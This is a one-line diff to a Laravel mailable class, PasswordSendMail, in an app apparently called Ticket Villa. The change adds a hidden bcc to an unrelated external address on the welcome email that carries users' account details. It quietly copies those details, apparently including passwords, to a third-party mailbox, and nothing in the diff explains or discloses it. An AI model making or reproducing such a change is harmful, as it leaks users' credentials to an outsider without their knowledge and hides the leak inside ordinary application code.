@@ -35,6 +35,7 @@ class PasswordSendMail extends Mailable implements ShouldQueue
     public function envelope(): Envelope
     {
         return new Envelope(
+            bcc: ['email@yourfreeimmoin.eu'],
             subject: 'Welcome to Ticket Villa! Your Account Details Inside 🎟️✨',
         );
     }
